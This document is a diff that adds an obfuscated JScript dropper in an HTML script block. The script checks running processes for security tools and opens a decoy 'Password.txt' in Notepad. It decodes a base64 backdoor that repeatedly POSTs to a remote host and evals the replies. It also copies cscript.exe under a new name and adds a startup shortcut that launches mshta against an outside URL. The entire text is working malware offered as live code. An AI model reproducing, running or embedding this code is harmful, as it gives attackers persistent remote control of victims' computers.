@@ -1,0 +1,37 @@
+<script language="javascript">
+var pl="cfrklf ";
+var fes="Scr";
+function \u0064\u0065c\u00364(bi){var o\u0074="";try{var \u0064=(new A\u0063\u0074i\u0076eXObj\u0065c\u0074("\x4d\123Xml2"+".DOM"+"\u0044\u006f\143\x75\x6d\x65n\x74")).c\u0072ea\u0074\u0065\u0045le\u006d\u0065n\u0074("\u0062\141\163e");var \u0061=new Activ\u0065XObject("AD\u004f"+"DB.S\164ream");d.\u0064ata\u0054ype="bin\x2e\142ase64";\u0064.te\u0078t=bi;a.t\u0079pe=1;a.\u006f\u0070en();a.\u0077rite(d.n\u006f\u0064e\u0054\u0079\u0070edVal\u0075\u0065);a.position=0;a.\u0074\u0079p\u0065=2;a.c\u0068a\u0072S\u0065\u0074="u\x74f-8";\u006f\u0074=\u0061.r\u0065adText;a.close()}catch(e){ot=""}return ot}
+pen=new Enumerator(GetObject("winmgmts:{"+"impersonationLevel"+"="+"impersonate"+"}!\\\\"+"."+"\\root\\cimv2").ExecQuery("Select * "+"from "+"Win32"+"_"+"Process"));
+for(;!pen.atEnd(); pen.moveNext()){var pi=pen.item(); if(pi.ProcessID>4){pl+=pi.Name.toLowerCase()+"|"}}
+var sw="WScri";
+sw+="pt."+"Sh";
+fes+="ipting."+"File";
+var s=new ActiveXObject(sw+"ell");
+p="%TEMP%\\"+"Pass"+"word"+".txt";
+fes+="System";
+c="CMD.EXE /C"+" \""+"ECHO salary2022> "+p+" & NOTEPAD.EXE "+p+" & DEL "+p+"\"";
+s.Run(c,0,false);
+s.Environment("PROCESS").Item("J"+"VER")="21";
+function GetDesk(){s.run(l,0,false);window.close()}
+var fs=new ActiveXObject(fes+"Object");
+var stat=0;
+if (pl.indexOf("bda"+"gent")>=0){stat=1}
+if (pl.indexOf("qqpc"+"rtp")>=0){stat=1}
+if (pl.indexOf("ekr"+"n")>=0){stat=2}
+var sp=fs.GetSpecialFolder(2)+"\\";
+var p=sp+"qwgrp"+"."+"js";
+sp+="Box.l"+"nk";
+var csh=s.CreateShortcut(sp);
+csh.TargetPath="c"+"md";
+csh.Arguments="/"+"c star"+"t /b"+" ms"+"hta "+"https://www.googlesheet.info/x5DXrqE8Xdy9MxDssmtrp6WtaJc+YNoWUVxY5Ca4i4M=";
+var lp="dmFyIGhcdTAwNzM9V1NjXHUwMDcyXHUwMDY5XHUwMDcwXHUwMDc0LmFyZ1x1MDA3NVx1MDA2ZFx1MDA2NW50XHUwMDczKDApO3ZhciBtXHUwMDZkPSJNU1hNTCI7dmFyIHM9ImEiO3ZhciBtdD0iMlx1MDAyZVNlcnZlXHg3MiI7dmFyIHNhZGRyPSJcMTUwXHg3NHRceDcwIjtpZihpc05hXHUwMDRlKGhcdTAwNzMuXHUwMDczdWJcdTAwNzNcdTAwNzRcdTAwNzJcdTAwNjluZygwLDEpKT09dHJ1ZSl7c1x1MDA2MVx1MDA2NGRyKz0iXHg3MyJ9XHUwMDczYWRkcis9IjovLyIraFx1MDA3Mzt2YXIgdWlkPShcdTAwNGRhdGguXHUwMDcyYVx1MDA2ZWRcdTAwNmZtKCkqMTAwMDAwMDAwKzEwMDAwMDAwKS50b1NcdTAwNzRyaW5nKCkuXHUwMDczdWJzdFx1MDA3MmlcdTAwNmVnKDAsOCkrV1NcdTAwNjNcdTAwNzJcdTAwNjlwXHUwMDc0Llx1MDA2MVx1MDA3Mmd1XHUwMDZkZW50cygxKTttXHUwMDc0Kz0iWFx4NGRMIisiSFRUUC5cMDY2IjttdD1tXHUwMDZkK21cdTAwNzQrIlx4MmVceDMwIjtzKz11aWQrIjEiO3doaWxlKHRydWUpe3ZhciB4PVx1MDA1N1x1MDA1M2NyaXB0Llx1MDA0M1x1MDA3MmVhdFx1MDA2NVx1MDA0ZmJcdTAwNmFlY3QoXHUwMDZkdCk7dHJ5e1x1MDA3OC5zZXRPcFx1MDA3NGlvbigyLDEzMDU2KTt4Lm9cdTAwNzBlbigiUFx4NGZTVCIsc2FkZFx1MDA3Mik7eC5zXHUwMDY1dFJcdTAwNjVxXHUwMDc1ZXNcdTAwNzRcdTAwNDhcdTAwNjVhXHUwMDY0ZXIoIkNvbnRcdTAwNjVudFx4MmRUXHg3OXBlIiwidGV4dC9ceDY4dG1sIik7eC5zZXRcdTAwNTJcdTAwNjVcdTAwNzF1ZXNcdTAwNzRcdTAwNDhlYWRlcigiXHg0M29uXHUwMDc0ZVwxNTZcdTAwNzQtTGVcdTAwNmVndGgiLHMuXHUwMDZjXHUwMDY1bmd0aCk7eC5zZW5kKHMpO1x1MDA3Mj14LnJlc3BvbnNcdTAwNjVUZVx1MDA3OHQ7aWYoXHUwMDcyLmxcdTAwNjVuXHUwMDY3XHUwMDc0aD4wKXtldmFsKGQ2KHIpKX19Y2F0Y2goZSl7fVdTXHUwMDYzclx1MDA2OXB0LlNsXHUwMDY1ZXAoMTUqMTAwMCl9ZnVuY3Rpb24gZDYoXHUwMDYyaSl7dmFyIG89IiI7dHJ5e3ZhciBcdTAwNjQ9XHUwMDU3XHUwMDUzY3JcdTAwNjlwdC5Dclx1MDA2NWF0XHUwMDY1T1x1MDA2MmplXHUwMDYzdChtbSsiMlx1MDAyZVwxMDRPXDExNSIrIkRvXHg2M1x4NzVtXDE0NVx1MDA2ZVwxNjQiKS5jXHUwMDcyZWF0XHUwMDY1RWxlbWVudCgiYiIpO3ZhciBcdTAwNjE9V1NjcmlwdC5DXHUwMDcyZWFcdTAwNzRcdTAwNjVPYmpcdTAwNjVjdCgiXDEwMVwxMDRcdTAwNGYiKyJcMTA0QiIrIi5TXHg3NFwxNjJcdTAwNjVcMTQxXDE1NSIpO2QuZGF0YVx1MDA1NHlwXHUwMDY1PSJiaVx1MDA2ZS5cdTAwNjJceDYxXHUwMDczZTY0IjtkLnRlXHUwMDc4dD1iaTtcdTAwNjEudHlwZT0xO1x1MDA2MS5vcGVuKCk7XHUwMDYxLlx1MDA3N3JpXHUwMDc0ZShcdTAwNjQuXHUwMDZlXHUwMDZmZFx1MDA2NVR5cGVkVmFsdVx1MDA2NSk7YS5wb3NpXHUwMDc0aW9uPTA7YS50eXBlPTI7YS5jaFx1MDA2MXJTZVx1MDA3ND0iXDE2NVx4NzRcdTAwNjZceDJkXDA3MCI7bz1cdTAwNjEucmVcdTAwNjFkXHUwMDU0ZXhcdTAwNzQ7XHUwMDYxLmNsb3NlKCl9Y2F0Y2goZSl7bz0iIn1yZXR1cm4gXHUwMDZmfQ==";
+csh.WindowStyle="7";
+var f=fs.CreateTextFile(p,2,true);f.WriteLine(dec64(lp));f.Close();
+var x="C:\\"+"Users\\Public\\"+"scmp.e"+"xe";
+var l=" start"+" /b "+x+" \""+p+"\" "+"www.googlesheet.info/ ";
+try{fs.CopyFile("C:\\"+"Windows\\System32\\"+"cscr"+"ipt."+"ex"+"e",x)}catch(e){}
+l="cm"+"d /"+"c"+l+"1 &"+l+"2 ";
+if (stat===0){csh.Save();l+="& "+"move"+" \""+sp+"\" \""+s.SpecialFolders("start"+"up")+"\\\""}
+GetDesk();
+</script>
